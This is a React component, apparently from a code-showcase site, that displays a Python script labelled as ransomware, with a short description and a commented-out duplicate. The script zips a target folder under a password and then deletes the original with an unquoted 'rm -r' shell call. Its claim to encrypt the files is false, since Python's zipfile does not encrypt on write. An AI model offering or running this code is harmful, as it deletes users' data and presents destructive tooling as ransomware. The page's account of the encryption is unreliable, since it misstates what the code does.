import React, { useState, useEffect } from 'react';

const FileDisplaykey = () => {

  return (
    <div className="file-display-container">
           <style>
        {`
          .file-display-code-container {
            width: 50%;
            float: left;
          }

          .file-display-description-container {
            width: 50%;
            float: right;
          }
        `}
      </style>
      <div className="file-display-code-container">
        <div className="file-display-item">
          <h2 className="file-display-heading">Ransom.py</h2>
          <pre className="file-display-content">
            <code>
              {`
import zipfile
import os
import getpass

def encrypt_folder(folder_path):
    # Get password for encryption
    password = getpass.getpass(prompt="Enter encryption password: ")

    # Create a zip file with encryption enabled
    zip_path = folder_path + '.zip'
    zip_file = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
    zip_file.setpassword(password.encode('utf-8'))

    # Add all files in the folder to the zip file
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            zip_file.write(file_path, os.path.relpath(file_path, folder_path))

    # Close the zip file
    zip_file.close()

    # Remove original folder
    os.system(f"rm -r {folder_path}")

    return zip_path

def decrypt_folder(zip_path):
    # Get password for decryption
    password = getpass.getpass(prompt="Enter decryption password: ")

    # Extract the files from the zip file with the given password
    with zipfile.ZipFile(zip_path, 'r') as zip_file:
        zip_file.extractall(pwd=password.encode('utf-8'))

    # Remove the zip file
    os.remove(zip_path)

if __name__ == '__main__':
    # Encrypt a folder
    encrypted_folder = encrypt_folder('/path/to/folder')

    # Decrypt the encrypted folder
    decrypt_folder(encrypted_folder)

              `}
            </code>
          </pre>
        </div>
      </div>
      <div className="file-display-description-container">
        <div className="file-display-item">
          <h2 className="file-display-heading">Description</h2>
          <p className="file-display-description">No Installs needed
            <br/>File location must be changed /path/to/folder<br/><br/>
            The python code will encrypt the folder and act as Ransomware where it can only be decrypted with the given key. 
            <br/> This code is for example use only and will need to have certain modifications made, it should not be tested on real folders or be expected to decrypt successfully
          </p>
        </div>
      </div>
    </div>
  );
};

export default FileDisplaykey;

// import React, { useState, useEffect } from 'react';
// import '../filedisplay.css';

// const FileDisplaykey = () => {

//   return (
    // <div className="file-display-container">
    //        <style>
    //     {`
    //       .file-display-code-container {
    //         width: 50%;
    //         float: left;
    //       }

    //       .file-display-description-container {
    //         width: 50%;
    //         float: right;
    //       }
    //     `}
    //   </style>
//       <div className="file-display-item">
//         <h2 className="file-display-heading">Ransomware.py</h2>
//         <pre className="file-display-content">
//           <code>
//             {`
// import zipfile
// import os
// import getpass

// def encrypt_folder(folder_path):
//     # Get password for encryption
//     password = getpass.getpass(prompt="Enter encryption password: ")

//     # Create a zip file with encryption enabled
//     zip_path = folder_path + '.zip'
//     zip_file = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
//     zip_file.setpassword(password.encode('utf-8'))

//     # Add all files in the folder to the zip file
//     for root, dirs, files in os.walk(folder_path):
//         for file in files:
//             file_path = os.path.join(root, file)
//             zip_file.write(file_path, os.path.relpath(file_path, folder_path))

//     # Close the zip file
//     zip_file.close()

//     # Remove original folder
//     os.system(f"rm -r {folder_path}")

//     return zip_path

// def decrypt_folder(zip_path):
//     # Get password for decryption
//     password = getpass.getpass(prompt="Enter decryption password: ")

//     # Extract the files from the zip file with the given password
//     with zipfile.ZipFile(zip_path, 'r') as zip_file:
//         zip_file.extractall(pwd=password.encode('utf-8'))

//     # Remove the zip file
//     os.remove(zip_path)

// if __name__ == '__main__':
//     # Encrypt a folder
//     encrypted_folder = encrypt_folder('/path/to/folder')

//     # Decrypt the encrypted folder
//     decrypt_folder(encrypted_folder)

//             `}
//           </code>
//         </pre>
//       </div>
//       <div className="file-display-item">
//         {/* <h2 className="file-display-heading">Example Output</h2>
//         <pre className="file-display-content">
//           <code>
//             {`

//             `}
//           </code>
//         </pre> */}
//       </div>
//       <div className="file-display-item">
//         <h2 className="file-display-heading">Description</h2>
//         <p className="file-display-description">No Installs needed
//         <br/>File location msut be changed /path/to/folder<br/><br/>
//         The python code will encrypt the folder and act as Ransomware where it can only be decrypted with the given key. 
//         <br/> This code is for example use only and will need to have certain modifications made, it should not be tested on real folders or be expected to decrypt succesfully
//         </p>
//       </div>
//     </div>
//   );
// };

// export default FileDisplaykey;
